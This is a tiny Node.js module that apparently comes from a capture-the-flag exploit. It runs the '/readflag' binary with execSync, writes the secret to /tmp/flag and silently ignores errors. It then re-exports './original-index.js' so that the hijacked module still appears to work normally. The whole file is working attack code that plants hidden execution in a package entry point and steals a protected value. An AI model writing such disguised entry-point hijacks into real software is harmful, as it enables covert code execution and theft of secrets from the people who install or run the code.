const fs = require('fs');
const { execSync } = require('child_process');
try {
  const flag = execSync('/readflag').toString();
  fs.writeFileSync('/tmp/flag', flag);
} catch (e) {}
module.exports = require('./original-index.js');
